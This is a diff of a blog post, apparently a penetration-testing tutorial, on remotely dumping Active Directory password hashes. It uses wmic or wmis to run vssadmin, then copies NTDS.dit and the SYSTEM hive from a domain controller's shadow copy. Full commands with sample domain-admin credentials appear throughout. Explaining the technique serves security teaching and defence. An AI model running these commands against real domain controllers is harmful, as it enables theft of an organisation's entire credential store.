@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="mubix">
 <meta name="description" content="This and part 2 are mostly just an update to http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.
- Ever run into a Domain Controller that wasn&#39;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance?" />
+ Ever run into a Domain Controller that wasn&amp;rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance?" />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -33,7 +33,7 @@
 
 <meta itemprop="name" content="Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1">
 <meta itemprop="description" content="This and part 2 are mostly just an update to http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.
- Ever run into a Domain Controller that wasn&#39;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance?">
+ Ever run into a Domain Controller that wasn&rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance?">
 <meta itemprop="datePublished" content="2013-06-10T13:11:03&#43;00:00" />
 <meta itemprop="dateModified" content="2013-06-10T13:11:03&#43;00:00" />
 <meta itemprop="wordCount" content="776">
@@ -43,7 +43,7 @@
 <meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1"/>
 <meta name="twitter:description" content="This and part 2 are mostly just an update to http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.
- Ever run into a Domain Controller that wasn&#39;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance?"/>
+ Ever run into a Domain Controller that wasn&rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance?"/>
 
 
 
@@ -123,13 +123,13 @@
                 <blockquote>
 <p>This and part 2 are mostly just an update to <a href="http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html">http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html</a> but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.</p>
 </blockquote>
-<p>Ever run into a Domain Controller that wasn't allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start</p>
+<p>Ever run into a Domain Controller that wasn&rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start</p>
 <p>First authenticate to the domain controller and make sure you have a good working directory to use.</p>
 <pre><code>net use \\DC1 /user:DOMAIN\domainadminsvc domainadminsvc123
 dir \\DC1\C$
-</code></pre><p>Alright, lets say &ldquo;TEMP&rdquo; is there and it's empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in <code>C:\TEMP</code> where we already made sure is clear.</p>
-<p>We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory's DB much like Window's SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.</p>
-<p>So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you've installed wmic for Linux via <a href="http://www.krenger.ch/blog/wmi-commands-from-linux/">http://www.krenger.ch/blog/wmi-commands-from-linux/</a> ) - this <em>IS</em> an interactive command so this won't work very nicely in a Meterpreter shell:</p>
+</code></pre><p>Alright, lets say &ldquo;TEMP&rdquo; is there and it&rsquo;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in <code>C:\TEMP</code> where we already made sure is clear.</p>
+<p>We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&rsquo;s DB much like Window&rsquo;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.</p>
+<p>So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&rsquo;ve installed wmic for Linux via <a href="http://www.krenger.ch/blog/wmi-commands-from-linux/">http://www.krenger.ch/blog/wmi-commands-from-linux/</a> ) - this <em>IS</em> an interactive command so this won&rsquo;t work very nicely in a Meterpreter shell:</p>
 <pre><code>C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c vssadmin list shadows 2&gt;&amp;1 &gt; C:\tempoutput.txt&quot;
 Executing (Win32_Process)-&gt;Create()
 Method execution successful.
@@ -144,7 +144,7 @@ instance of __PARAMETERS
 <li><code>wmic /node:DC1</code> - tells it to interact with the WMI API on DC1</li>
 <li><code>/user:DOMAIN\domainadminsvc /password:domainadminsvc123</code> - authentication</li>
 <li><code>process call create</code> - WMI speak for create a process</li>
-<li><code>cmd /c</code> - vssadmin doesn't operate outside of cmd for some reason&hellip;</li>
+<li><code>cmd /c</code> - vssadmin doesn&rsquo;t operate outside of cmd for some reason&hellip;</li>
 <li><code>vssadmin list shadows</code> - List any shadow volumes that already exist</li>
 <li><code>2&gt;&amp;1 &gt; C:\temp\output.txt</code> - Take STDIN and STDERROR and throw it in a text file on DC1 C:\TEMP. Make sure you specify full path because you will be executing from within C:\Windows\System32 and its a pain to find anything in that directory. So if you just specify &gt; bob.txt you get to hunt in C:\Windows\System32 or wherever WMI wants to execute you from for bob.txt</li>
 </ul>
@@ -169,17 +169,17 @@ vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 (C) Copyright 2001-2005 Microsoft Corp.
 
 No items found that satisfy the query
-</code></pre><p>If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don't have to remember this):</p>
+</code></pre><p>If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&rsquo;t have to remember this):</p>
 <pre><code>C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1 &gt; C:\temp\output.txt&quot;
-</code></pre><p>The other thing to keep in mind is that NTDS.dit isn't always on the main drive. It is commonly on a &ldquo;D&rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)</p>
+</code></pre><p>The other thing to keep in mind is that NTDS.dit isn&rsquo;t always on the main drive. It is commonly on a &ldquo;D&rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)</p>
 <p>Next we just copy the files out of the shadow copies. First the SYSTEM hive:</p>
 <pre><code>C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM.hive 2&gt;&amp;1 &gt; C:\temp\output.txt&quot;
-</code></pre><p>Then the NTDS.dit (notice this one isn't in System32):</p>
+</code></pre><p>Then the NTDS.dit (notice this one isn&rsquo;t in System32):</p>
 <pre><code>C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&gt;&amp;1 &gt; C:\temp\output.txt&quot;
 </code></pre><p>In Kali Linux you could use the WMIS package to do much the same thing:</p>
 <pre><code>root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //DC1 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&gt;&amp;1 &gt; C:\temp\output.txt
 NTSTATUS: NT_STATUS_OK - Success
-</code></pre><p>Copy those files to your own system for offline extraction which I'll cover in part 2.</p>
+</code></pre><p>Copy those files to your own system for offline extraction which I&rsquo;ll cover in part 2.</p>
 
             </div>
         </article>
